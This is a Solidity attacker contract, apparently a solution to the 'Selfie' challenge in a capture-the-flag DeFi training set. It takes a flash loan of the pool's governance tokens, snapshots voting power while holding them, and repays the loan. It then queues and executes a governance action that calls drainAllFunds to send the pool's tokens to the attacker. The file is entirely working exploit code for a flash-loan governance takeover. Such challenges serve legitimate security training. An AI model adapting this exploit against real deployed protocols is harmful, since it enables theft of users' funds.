// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

/**
 * @title Attacker
 * @author DB
 */

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface IDVTSnapshot {
    function snapshot() external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract AttackerSelfie {
    using Address for address payable;

    address flashLoanerPool;
    address dvtToken;
    address governance;
    uint256 actionId;

    constructor(
        address _flashLoanerPool,
        address _dvtToken  ,      
        address _governance
    ) {
        flashLoanerPool = _flashLoanerPool;
        dvtToken = _dvtToken;        
        governance = _governance;
    }

    receive() external payable {
        console.log("REC  - ", msg.value);
    }

    // function takeSnapshot() external payable {
    function takeSnapshot() external {
        ISelfiePool fpool = ISelfiePool(flashLoanerPool);
        IDVTSnapshot token = IDVTSnapshot(dvtToken);        
        uint256 amount = token.balanceOf(address(fpool));
        console.log("bal BEF: ", token.balanceOf(address(this)));
        fpool.flashLoan(amount);
    }

    function receiveTokens(address token_, uint256 amount_) external {        
        IDVTSnapshot token = IDVTSnapshot(token_);
        ISelfiePool fpool = ISelfiePool(flashLoanerPool);
        uint256 idSnap = token.snapshot();
        console.log("idSnap:   ", idSnap);
        console.log("bal AFT:", token.balanceOf(address(this)));
        token.transfer(address(fpool), amount_);
    }

    function callQueueAction(address attacker_) external returns(uint256) {
        IGovernance govContract = IGovernance(governance);       

        ISelfiePool fpool = ISelfiePool(flashLoanerPool);
        bytes memory drainAllFundsPayload = abi.encodeWithSignature("drainAllFunds(address)", attacker_);
        // store actionId so we can later execute it
        actionId = govContract.queueAction(
            address(fpool),
            drainAllFundsPayload,
            0
        );
        return actionId;
    }

    function callExecuteAction() external {
        IDVTSnapshot token = IDVTSnapshot(dvtToken);

        console.log("bal BEF:  ", token.balanceOf(address(this)));

        IGovernance govContract = IGovernance(governance);       
        govContract.executeAction(actionId);

        console.log("bal AFT:  ", token.balanceOf(address(this)));
    }
}
